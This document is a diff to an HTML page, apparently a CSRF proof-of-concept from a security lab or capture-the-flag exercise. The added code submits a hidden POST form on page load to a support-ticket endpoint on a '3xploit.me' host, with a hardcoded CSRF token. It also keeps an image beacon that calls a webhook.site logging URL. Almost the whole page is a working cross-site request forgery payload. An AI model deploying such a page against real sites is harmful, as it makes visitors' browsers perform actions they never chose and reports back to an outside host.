@@ -1,14 +1,18 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-<title>Page Title</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Auto Submit Form</title>
 </head>
-<body>
-
-<h1>This is a Heading</h1>
-<p>This is a paragraph.</p>
-<iframe src="https://webhook.site/018a0620-b18e-4b00-9685-3e31a3cda308"></iframe>
+<body onload="document.getElementById('supportForm').submit();">
+    <form id="supportForm" action="https://c28da2aeeeed.3xploit.me/index.php?page=support/ticket.php" method="POST">
+        <input type="hidden" name="title" value="It Works">
+        <input type="hidden" name="description" value="Yes">
+        <input type="hidden" name="url" value="">
+        <input type="hidden" name="csrf_token" value="b1ca069027a3bc5007f5178c9d85bcf5d5faaa6bad3fb1245443012d7805040e">
+        <input type="hidden" name="submit_ticket" value="">
+    </form>
 <img src="https://webhook.site/018a0620-b18e-4b00-9685-3e31a3cda308">
-
 </body>
-</html> 
+</html>
